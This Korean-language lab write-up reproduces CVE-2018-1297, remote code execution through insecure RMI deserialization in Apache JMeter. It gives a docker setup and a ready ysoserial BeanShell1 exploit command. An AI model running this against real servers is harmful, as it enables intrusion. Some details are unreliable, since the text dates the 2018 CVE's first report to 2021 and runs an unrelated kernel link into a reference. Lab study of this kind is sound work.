## CVE-2018-1297



#### Apache Jmeter RMI De-Serialization Command Execution Vulnerability

| **First Reporter** |          **Philippe Mouawad**          |
| :----------------- | :------------------------------------: |
| **Author**         | **SeongHyeon Oh(os5844557@gmail.com)** |
| **Date Created**   |             **2023.10.30**             |
| **Version**        |               **1.0.0**                |



### INDEX

-----

**1. introduce**

**2. Code Audit**

**3. Reproduce**

**4. Reference**



#### 1. Introduce

----

  Apache JMeter은 미국 아파치 소프트웨어 재단(American Apache Software Foundation)이 스트레스 테스트 및 성능 테스트를 위해 Java 언어로 작성한 오픈 소스 소프트웨어 세트입니다.

  CVE-2018-1297은 JMeterEngine 에서 발견되었으며 2021년 01월 23일 Philippe Mouawad에 의해 최초로 보고되었다. 

  이는 분산 테스트만(RMI 기반) 사용하는 경우 jmeter가 보안되지 않은 RMI를 사용하므로 공격자가 JMeterEngine에 액세스하고 승인되지 않은 코드를 보낼 수 있는 취약점이다.

  해당 vulnerability는 JMeter 2.X, 3.X에서 트리거되며, JMeter 4.0에서 patch가 이루어졌다. CVSS v3 score은 9.8이다.

   

#### 2. Reproduce

------

대상 환경: Kali Linux

- `docker-compose up -d`를 실행하여 테스트 환경을 실행함.
- `java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 'touch /tmp/success'`를 실행하여 지정된 페이로드가 포함된 패킷을 대상으로 보낸다.

 

#### 3. Conclusion

----

![image](https://github.com/whiteshadowhack/whitehat-school-vulhub/assets/122043815/07dc73a8-22f7-4e17-97a8-37f9c3717150)

![image](https://github.com/whiteshadowhack/whitehat-school-vulhub/assets/122043815/41e91eb1-2687-4711-97b7-a181d52da39e)

![image](https://github.com/whiteshadowhack/whitehat-school-vulhub/assets/122043815/50fcd5e9-ec9c-4c1e-838c-531d28b2b89b)

![image](https://github.com/whiteshadowhack/whitehat-school-vulhub/assets/122043815/84ab9105-8e46-40c4-b444-09c8c1253ec0)

![image](https://github.com/whiteshadowhack/whitehat-school-vulhub/assets/122043815/69c6d149-28f2-4c6c-8764-02ebafa81e1a)



#### 4. Reference

----

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1297

https://nvd.nist.gov/vuln/detail/CVE-2018-1297

https://ubuntu.com/security/CVE-2018-1297

https://www.cvedetails.com/cve/CVE-2018-1297/

https://lists.apache.org/thread/nmnl88g0t1zm5rs6nfbfc7s30j141645https://elixir.bootlin.com/linux/v5.14.15/source/net/tipc/crypto.c

https://bz.apache.org/bugzilla/show_bug.cgi?id=62039

